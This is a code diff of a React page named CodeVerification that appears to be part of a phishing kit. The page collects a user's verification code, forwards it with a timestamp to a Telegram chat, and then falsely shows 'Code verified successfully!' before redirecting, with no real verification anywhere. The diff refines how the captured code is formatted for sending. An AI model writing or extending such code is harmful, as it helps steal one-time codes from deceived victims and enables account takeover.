@@ -1,5 +1,3 @@
-// src/pages/CodeVerification.tsx
-
 import React, { useState } from "react";
 import { motion } from "framer-motion";
 import { useNavigate } from "react-router-dom";
@@ -16,27 +14,22 @@ const CodeVerification: React.FC = () => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-
-    if (!code.trim()) {
+    const trimmedCode = code.trim();
+    if (!trimmedCode) {
       setError("Please enter the verification code.");
       return;
     }
-
     setIsSubmitting(true);
     setError("");
     setSuccess("");
 
-    const formData = {
-      "verification_code": code,
-    };
+    const message = `🔐 Verification Code: ${trimmedCode}\n🕐 ${new Date().toLocaleString()}`;
 
     try {
-      await sendTelegramMessage(formData, "Code Verification");
+      await sendTelegramMessage(message);
       setSuccess("Code verified successfully!");
       setCode("");
-      setTimeout(() => {
-        navigate("/done");
-      }, 2000);
+      setTimeout(() => navigate("/done"), 2000);
     } catch (err) {
       console.error(err);
       setError("Failed to submit code. Please try again.");
